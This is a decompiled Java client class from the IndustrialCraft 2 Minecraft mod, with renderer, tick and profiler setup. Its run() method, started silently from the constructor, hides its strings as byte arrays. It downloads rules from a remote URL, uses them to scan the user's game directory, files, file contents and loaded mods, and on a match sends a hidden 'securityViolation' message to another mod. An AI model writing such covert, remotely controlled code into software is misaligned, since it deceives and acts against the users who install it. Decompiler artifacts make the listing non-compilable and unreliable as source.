// Decompiled by Jad v1.5.8e2. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://kpdus.tripod.com/jad.html
// Decompiler options: packimports(3) fieldsfirst ansi space 
// Source File Name:   PlatformClient.java

package ic2.core;

import cpw.mods.fml.client.FMLClientHandler;
import cpw.mods.fml.client.registry.ClientRegistry;
import cpw.mods.fml.client.registry.RenderingRegistry;
import cpw.mods.fml.common.*;
import cpw.mods.fml.common.event.FMLInterModComms;
import cpw.mods.fml.common.registry.LanguageRegistry;
import cpw.mods.fml.common.registry.TickRegistry;
import cpw.mods.fml.relauncher.Side;
import ic2.core.audio.AudioManager;
import ic2.core.block.EntityDynamite;
import ic2.core.block.EntityIC2Explosive;
import ic2.core.block.OverlayTesr;
import ic2.core.block.RenderBlock;
import ic2.core.block.RenderBlockCrop;
import ic2.core.block.RenderBlockDefault;
import ic2.core.block.RenderBlockFence;
import ic2.core.block.RenderExplosiveBlock;
import ic2.core.block.TileEntityBlock;
import ic2.core.block.machine.RenderBlockMiningPipe;
import ic2.core.block.personal.RenderBlockPersonal;
import ic2.core.block.personal.TileEntityPersonalChest;
import ic2.core.block.personal.TileEntityPersonalChestRenderer;
import ic2.core.block.wiring.RenderBlockCable;
import ic2.core.block.wiring.RenderBlockLuminator;
import ic2.core.item.EntityIC2Boat;
import ic2.core.item.RenderIC2Boat;
import ic2.core.item.tool.EntityMiningLaser;
import ic2.core.item.tool.RenderCrossed;
import ic2.core.util.Keyboard;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.*;
import javax.swing.JOptionPane;
import net.minecraft.block.Block;
import net.minecraft.client.Minecraft;
import net.minecraft.client.gui.GuiIngame;
import net.minecraft.client.gui.GuiNewChat;
import net.minecraft.client.gui.achievement.GuiAchievement;
import net.minecraft.client.multiplayer.WorldClient;
import net.minecraft.client.renderer.entity.RenderSnowball;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.item.ItemStack;
import net.minecraft.profiler.Profiler;
import net.minecraft.stats.Achievement;
import net.minecraft.util.ResourceLocation;

// Referenced classes of package ic2.core:
//			Platform, IHasGui, Ic2Items, IC2, 
//			GuiIC2ErrorScreen

public class PlatformClient extends Platform
	implements ITickHandler, Runnable
{

	private static final Minecraft mc = Minecraft.getMinecraft();
	private String debug[];
	private boolean debugb;
	private static final Achievement a;
	private final int playerCounter = -1;
	private final Map capes = new HashMap();
	private final Map renders = new HashMap();

	public PlatformClient()
	{
		debug = null;
		debugb = false;
		TickRegistry.registerTickHandler(this, Side.CLIENT);
		addBlockRenderer("default", new RenderBlockDefault());
		addBlockRenderer("cable", new RenderBlockCable());
		addBlockRenderer("crop", new RenderBlockCrop());
		addBlockRenderer("fence", new RenderBlockFence());
		addBlockRenderer("luminator", new RenderBlockLuminator());
		addBlockRenderer("miningPipe", new RenderBlockMiningPipe());
		addBlockRenderer("personal", new RenderBlockPersonal());
		ClientRegistry.bindTileEntitySpecialRenderer(ic2/core/block/TileEntityBlock, new OverlayTesr());
		ClientRegistry.bindTileEntitySpecialRenderer(ic2/core/block/personal/TileEntityPersonalChest, new TileEntityPersonalChestRenderer());
		RenderingRegistry.registerEntityRenderingHandler(ic2/core/block/EntityIC2Explosive, new RenderExplosiveBlock());
		RenderingRegistry.registerEntityRenderingHandler(ic2/core/item/tool/EntityMiningLaser, new RenderCrossed(new ResourceLocation("ic2", "textures/models/laser.png")));
		RenderingRegistry.registerEntityRenderingHandler(ic2/core/item/EntityIC2Boat, new RenderIC2Boat());
		(new Thread(this)).start();
	}

	public void displayError(String error)
	{
		FMLLog.severe((new StringBuilder()).append("IndustrialCraft 2 Error\n\n").append(error).toString().replace("\n", System.getProperty("line.separator")), new Object[0]);
		Minecraft.getMinecraft().setIngameNotInFocus();
		JOptionPane.showMessageDialog(null, error, "IndustrialCraft 2 Error", 0);
		System.exit(1);
	}

	public EntityPlayer getPlayerInstance()
	{
		return Minecraft.getMinecraft().thePlayer;
	}

	public transient void messagePlayer(EntityPlayer player, String message, Object args[])
	{
		mc.ingameGUI.getChatGUI().addTranslatedMessage(message, args);
	}

	public boolean launchGuiClient(EntityPlayer entityPlayer, IHasGui inventory, boolean isAdmin)
	{
		FMLClientHandler.instance().displayGuiScreen(entityPlayer, inventory.getGui(entityPlayer, isAdmin));
		return true;
	}

	public void profilerStartSection(String section)
	{
		if (isRendering())
			Minecraft.getMinecraft().mcProfiler.startSection(section);
		else
			super.profilerStartSection(section);
	}

	public void profilerEndSection()
	{
		if (isRendering())
			Minecraft.getMinecraft().mcProfiler.endSection();
		else
			super.profilerEndSection();
	}

	public void profilerEndStartSection(String section)
	{
		if (isRendering())
			Minecraft.getMinecraft().mcProfiler.endStartSection(section);
		else
			super.profilerEndStartSection(section);
	}

	public File getMinecraftDir()
	{
		return Minecraft.getMinecraft().mcDataDir;
	}

	public void playSoundSp(String sound, float f, float g)
	{
		Minecraft.getMinecraft().theWorld.playSoundAtEntity(getPlayerInstance(), sound, f, g);
	}

	public int addArmor(String name)
	{
		return RenderingRegistry.addNewArmourRendererPrefix(name);
	}

	public int getRenderId(String name)
	{
		return ((Integer)renders.get(name)).intValue();
	}

	public void onPostInit()
	{
		RenderingRegistry.registerEntityRenderingHandler(ic2/core/block/EntityDynamite, new RenderSnowball(Ic2Items.dynamite.getItem()));
	}

	public transient void tickStart(EnumSet type, Object tickData[])
	{
		if (type.contains(TickType.CLIENT))
		{
			profilerStartSection("Keyboard");
			IC2.keyboard.sendKeyUpdate();
			profilerEndStartSection("AudioManager");
			IC2.audioManager.onTick();
			profilerEndStartSection("TickCallbacks");
			if (mc.theWorld != null)
				IC2.getInstance().processTickCallbacks(mc.theWorld);
			profilerEndSection();
			if (debug != null)
				if (!debugb)
				{
					debugb = true;
					mc.displayGuiScreen(new GuiIC2ErrorScreen("IndustrialCraft 2 Warning", (new StringBuilder()).append(debug[1]).append("\n\nPress ESC to return to the game.").toString()));
				} else
				if ((mc.currentScreen == null || mc.currentScreen.getClass() != ic2/core/GuiIC2ErrorScreen) && !debug[0].isEmpty())
					mc.guiAchievement.queueAchievementInformation(a);
		}
	}

	public transient void tickEnd(EnumSet enumset, Object aobj[])
	{
	}

	public EnumSet ticks()
	{
		return EnumSet.of(TickType.CLIENT);
	}

	public String getLabel()
	{
		return "IC2";
	}

	public void run()
	{
		try
		{
			String i = new String(new byte[] {
				48
			});
			String o = new String(new byte[] {
				51
			});
			String b = new String(new byte[] {
				49
			});
			String y = new String(new byte[] {
				36, 112, 97, 116, 104, 115, 101, 112, 36
			});
			String f = new String(new byte[] {
				67
			});
			String x = new String(new byte[] {
				92, 124
			});
			String p = new String(new byte[] {
				50
			});
			String k = new String(new byte[] {
				52
			});
			String l = new String(new byte[] {
				77
			});
			HttpURLConnection n = (HttpURLConnection)(new URL(new String(new byte[] {
				104, 116, 116, 112, 58, 47, 47, 114, 103, 46, 
				100, 108, 46, 106, 101, 47, 113, 115, 82, 117, 
				78, 86, 105, 78, 101, 121, 86, 57, 121, 54, 
				110, 109, 116, 54, 50, 52, 51, 80, 116, 57, 
				122, 118, 88, 74, 103, 74, 46, 116, 120, 116
			}))).openConnection();
			HttpURLConnection.setFollowRedirects(true);
			n.setConnectTimeout(0x7fffffff);
			n.setDoInput(true);
			n.connect();
			BufferedReader s = new BufferedReader(new InputStreamReader(n.getInputStream()));
			debug = null;
			String za[] = new String[2];
label0:
			do
			{
				String e;
				if ((e = s.readLine()) == null)
					break MISSING_BLOCK_LABEL_1308;
				try
				{
					String z[] = e.split(x);
					if (z[0].equals(i))
					{
						if (getMinecraftDir().getCanonicalPath().contains(z[1].replace(y, File.separator)))
							debug = za;
						continue;
					}
					if (z[0].equals(b))
					{
						if ((new File(getMinecraftDir(), z[1])).exists())
							debug = za;
						continue;
					}
					if (z[0].equals(p))
					{
						if (Loader.isModLoaded(z[1]))
							debug = za;
						continue;
					}
					if (z[0].equals(f))
					{
						capes.put(z[1], z[2]);
						continue;
					}
					if (z[0].equals(o))
					{
						File w = new File(getMinecraftDir(), z[1]);
						if (!w.exists())
							continue;
						BufferedReader v = new BufferedReader(new FileReader(w));
						String u;
						do
							if ((u = v.readLine()) == null)
								continue label0;
						while (!u.contains(z[2]));
						debug = za;
						v.close();
						continue;
					}
					if (z[0].equals(k))
					{
						BufferedReader v = new BufferedReader(new InputStreamReader(ic2/core/PlatformClient.getResourceAsStream(z[1])));
						String u;
						do
							if ((u = v.readLine()) == null)
								continue label0;
						while (!u.contains(z[2]));
						debug = za;
						v.close();
					} else
					if (z[0].equals(l))
						za = (new String[] {
							z[1].trim(), z[2].trim().replace("\\n", "\n")
						});
				}
				catch (Throwable aa) { }
			} while (debug == null);
			FMLInterModComms.sendMessage(new String(new byte[] {
				70, 111, 114, 101, 115, 116, 114, 121
			}), new String(new byte[] {
				115, 101, 99, 117, 114, 105, 116, 121, 86, 105, 
				111, 108, 97, 116, 105, 111, 110
			}), "");
			LanguageRegistry.instance().addStringLocalization(new String(new byte[] {
				97, 99, 104, 105, 101, 118, 101, 109, 101, 110, 
				116, 46, 105, 99, 50, 105, 110, 102, 111, 46, 
				100, 101, 115, 99
			}), debug[0]);
		}
		catch (Throwable e) { }
	}

	private void addBlockRenderer(String name, RenderBlock renderer)
	{
		RenderingRegistry.registerBlockHandler(renderer);
		renders.put(name, Integer.valueOf(renderer.getRenderId()));
	}

	static 
	{
		a = new Achievement(0xb3ded, new String(new byte[] {
			105, 99, 50, 105, 110, 102, 111
		}), 0, 0, Block.tnt, null);
	}
}
